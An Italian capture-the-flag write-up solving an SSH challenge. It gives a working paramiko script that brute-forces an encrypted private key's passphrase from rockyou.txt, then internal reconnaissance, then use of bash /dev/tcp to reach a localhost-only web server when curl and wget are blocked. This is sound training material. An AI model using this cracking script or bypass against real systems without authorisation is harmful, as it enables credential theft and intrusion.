# Internal Service

**Competizione:** ITSCyberGame<br>
**Categoria:** SSH<br>
**Servizio:** `sfide.itscybergame.it:<port_number>` <br>
**Credenziali:** `ctfplayer` + chiave privata `ctf_id_rsa`

---

## Descrizione
> Ciao! Vorrei tanto entrare in questa macchina virtuale dei nostri competitor che ho trovato nel cloud, ma la chiave privata mi chiede una password... Riesci ad entrare e raccontarmi cosa c'è dentro?
> User: ctfplayer

Viene fornita una chiave privata SSH protetta da passphrase per accedere a una macchina virtuale. All'interno è presente un servizio web interno non accessibile dall'esterno. L'obiettivo è recuperare la flag.

---

## Soluzione

### 1. Analisi della chiave privata

```bash
file ctf_id_rsa
# ctf_id_rsa: OpenSSH private key
```

La chiave è protetta da passphrase. Analisi del formato:

```python
import base64, struct

data = open('ctf_id_rsa').read()
raw = base64.b64decode(''.join(data.strip().split('\n')[1:-1]))
# Cipher: aes256-ctr
# KDF: bcrypt
# Rounds: 24
```

Cifrata con `aes256-ctr`, KDF `bcrypt` con **24 round** → crack lento su CPU (~4-5 hash/sec).

---

### 2. Crack della passphrase — Paramiko brute force

`john` community non supporta il formato `$sshng$6$`. Soluzione alternativa: brute force diretto con **paramiko**, che tenta di decifrare la chiave per ogni password candidata.

```python
import paramiko, io, time

key_data = open('ctf_id_rsa', 'r').read()

def try_pass(pwd):
    try:
        paramiko.RSAKey.from_private_key(io.StringIO(key_data), password=pwd)
        return True
    except:
        return False

start = time.time()
count = 0
with open('rockyou.txt', 'r', encoding='latin-1', errors='ignore') as f:
    for line in f:
        pwd = line.strip()
        count += 1
        if try_pass(pwd):
            print(f"[FOUND] Passphrase: {pwd} (after {count} attempts, {time.time()-start:.1f}s)")
            break
        if count % 100 == 0:
            print(f"  {count} tried | {count/(time.time()-start):.1f}/s | last: {pwd}", end='\r')
```

**Risultato:** passphrase = `banana` (245 tentativi, ~55 secondi)

---

### 3. Accesso SSH

```bash
chmod 600 ctf_id_rsa
ssh -i ctf_id_rsa -p <port_number> ctfplayer@sfide.itscybergame.it
# Enter passphrase: banana
```

Shell ottenuta come `ctfplayer` (uid=1001).

---

### 4. Ricognizione interna

```bash
ls /opt
# secret_web

ls -la /opt/
# drwx------ 1 webdaemon webdaemon 4096 Mar 25 18:25 secret_web
# Permission denied per ctfplayer

ss -tlnp
# LISTEN  0  5  127.0.0.1:3000  0.0.0.0:*

ps -ef
# webdaemon  9  1  bash -c cd /opt/secret_web && python3 -m http.server 3000 --bind 127.0.0.1
# webdaemon  10 9  python3 -m http.server 3000 --bind 127.0.0.1
```

Servizio `python3 -m http.server` in ascolto su `127.0.0.1:3000` (solo localhost), avviato da `webdaemon`. La directory `/opt/secret_web` non è leggibile da `ctfplayer`.

---

### 5. Accesso al servizio interno — bash /dev/tcp

`curl`, `wget` e `python3` non disponibili o bloccati (`Permission denied`). Soluzione: **bash built-in `/dev/tcp`**, che non richiede tool esterni.

```bash
# GET /
exec 3<>/dev/tcp/127.0.0.1/3000
echo -e "GET / HTTP/1.0\r\nHost: 127.0.0.1\r\n\r\n" >&3
cat <&3
exec 3>&-
```

**Risposta:**

```
HTTP/1.0 200 OK
Server: SimpleHTTP/0.6 Python/3.10.12
Content-type: text/html
Content-Length: 27

flag{...}
```

---

## Flag

```
flag{...}
```

---

## Conclusioni

| Step | Tecnica | Dettaglio |
|------|---------|-----------|
| **1** | SSH key crack | Paramiko brute force su rockyou → `banana` (245 tentativi) |
| **2** | SSH access | `ctfplayer` con chiave decifrata |
| **3** | Internal recon | `ss -tlnp` rivela `127.0.0.1:3000`, `ps -ef` rivela `python3 -m http.server` |
| **4** | Tool bypass | curl/wget/python3 bloccati → bash `/dev/tcp` raw socket |
| **5** | Flag exfil | `GET /` sul server interno restituisce la flag direttamente |

**Lezioni apprese:**

- `bcrypt` con rounds elevati rende il crack SSH molto lento su CPU, usare GPU (hashcat) o ridurre il dizionario ai termini più probabili
- `python3 -m http.server` non ha autenticazione: chiunque raggiunga la porta ottiene il contenuto
- Quando tutti i tool HTTP sono bloccati, bash `/dev/tcp` è sempre disponibile come fallback per connessioni TCP raw